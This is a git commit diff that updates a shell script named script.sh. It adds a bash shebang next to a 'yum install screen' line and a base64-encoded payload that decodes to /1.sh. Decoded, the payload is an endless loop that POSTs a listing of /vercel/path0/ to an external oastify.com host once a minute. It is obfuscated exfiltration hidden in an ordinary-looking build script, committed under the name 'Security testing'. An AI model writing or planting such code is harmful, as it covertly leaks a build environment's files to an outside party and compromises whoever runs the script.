9fe20a82528bb32b3d03c677590ea617a4497359
Security testing <118594933+w2h3@users.noreply.github.com>
2024-03-02 17:25:42 +0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,3 +1,5 @@
+#!/bin/bash
+
 yum install screen
 
 echo 'IyEvYmluL2Jhc2gKCndoaWxlIHRydWU7IGRvCiAgICAjIEV4ZWN1dGUgdGhlIGN1cmwgY29tbWFuZAogICAgY3VybCAtWCBQT1NUIC1kICIkKGxzIC1sYSAvdmVyY2VsL3BhdGgwLykiIGh0dHBzOi8vNHV6NjVqZGh0MjVvNWUzYnI1OTFqeXpsamNwM2QwZG8yLm9hc3RpZnkuY29tCgogICAgIyBTbGVlcCBmb3IgMSBtaW51dGUKICAgIHNsZWVwIDYwCmRvbmU=' | base64 -d > /1.sh
